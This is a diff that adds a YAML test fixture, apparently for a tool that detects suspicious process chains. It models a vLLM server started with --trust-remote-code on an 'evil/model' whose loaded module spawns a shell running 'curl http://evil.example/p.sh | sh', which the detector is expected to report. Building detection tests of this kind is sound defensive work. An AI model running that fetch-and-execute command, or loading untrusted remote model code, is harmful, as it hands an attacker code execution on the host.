@@ -1,0 +1,32 @@
+subjects:
+  bash:
+    session: pid/100:1
+    program: /bin/bash
+    actors: [{id: u1, name: MLOps, email: mlops@example.com}]
+    device: gpu-1
+    source: probe
+  vllm:
+    session: pid/101:1
+    parent: bash
+    program: /usr/bin/python3.11
+    actors: [{id: u1, name: MLOps}]
+    device: gpu-1
+    source: probe
+  sh:
+    session: pid/102:1
+    parent: vllm
+    program: /bin/sh
+    actors: [{id: u1, name: MLOps}]
+    device: gpu-1
+    source: probe
+observations:
+  - {kind: session_start, subject: bash}
+  - {kind: spawn, subject: vllm, cmdline: "python3.11 -m vllm.entrypoints.openai.api_server --model evil/model --trust-remote-code"}
+  - {kind: file_read, subject: vllm, path: /root/.cache/huggingface/hub/models--evil--model/snapshots/abc/config.json}
+  - {kind: file_read, subject: vllm, path: /root/.cache/huggingface/modules/transformers_modules/evil/model/abc/modeling_evil.py}
+  - {kind: spawn, subject: sh, cmdline: "/bin/sh -c curl http://evil.example/p.sh | sh"}
+expect:
+  action: report
+  reason_contains: "model server: python3.11"
+  output_contains: ["vLLM auto_map remote-code load then process execution in one session - 1 dynamic module file(s)"]
+  chain_min: 3
